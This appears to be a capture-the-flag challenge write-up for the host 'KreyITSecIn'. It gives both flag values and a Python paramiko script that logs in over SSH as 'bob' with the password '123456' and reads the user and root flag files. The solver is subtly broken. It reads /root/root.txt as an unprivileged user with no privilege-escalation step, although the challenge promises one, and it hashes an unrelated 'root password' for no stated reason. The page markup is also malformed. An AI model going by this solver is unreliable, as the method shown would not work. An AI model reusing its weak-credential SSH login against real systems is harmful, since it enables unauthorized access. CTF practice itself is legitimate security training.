![](assets/images/banner.png)



<img src="assets/images/htb.png" style="margin-left: 20px; zoom: 60%;" align=left />    	<fontFlag</font>

​		27<sup>th</sup> Sep 2023

​		Challenge Author(s): Manuel Krey

### Description:

This challenge is designed to test participants' skills in penetration testing and privilege escalation. Participants must gain access to a vulnerable host and retrieve both the user and root flags.

### Objective

The goal of the challenge is to extract the user.txt and root.txt flags by following the steps taken on the vulnerable host.

### Difficulty:

`medium`

### Flag:

User: `HTB{e10adc3949ba59abbe56e057f20f883e}`  
Root: `HTB{Y0uhav3Captur3Dth3FlaG}`

# Challenge

You have access to the vulnerable host, KreyITSecIn. Your objective is to find the user.txt and root.txt flags. The user.txt flag is located in the home directory of the user "bob," and the root.txt flag is in the root directory.

# Solver

```python
import paramiko
import hashlib

# Target host and SSH credentials
target_host = "10.0.2.4"
target_port = 22
target_user = "bob"
target_password = "123456"  # This is the password used in the challenge

# Establish an SSH connection
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect(target_host, port=target_port, username=target_user, password=target_password)
    print(f"Successfully logged in as {target_user}@{target_host}:{target_port}!")

    # Retrieve the user flag
    user_flag_path = "/home/bob/user.txt"
    stdin, stdout, stderr = ssh.exec_command(f"cat {user_flag_path}")
    user_flag = stdout.read().strip()
    print(f"User Flag: {user_flag}")

    # Retrieve the root flag
    root_flag_path = "/root/root.txt"
    stdin, stdout, stderr = ssh.exec_command(f"cat {root_flag_path}")
    root_flag = stdout.read().strip()
    print(f"Root Flag: {root_flag}")

    # Calculate the MD5 hash of the root password
    root_password = "123456789"
    root_password_md5 = hashlib.md5(root_password.encode()).hexdigest()
    print(f"MD5 Hash of Root Password: {root_password_md5}")

except Exception as e:
    print(f"Error connecting to the host: {e}")
finally:
    ssh.close()


```
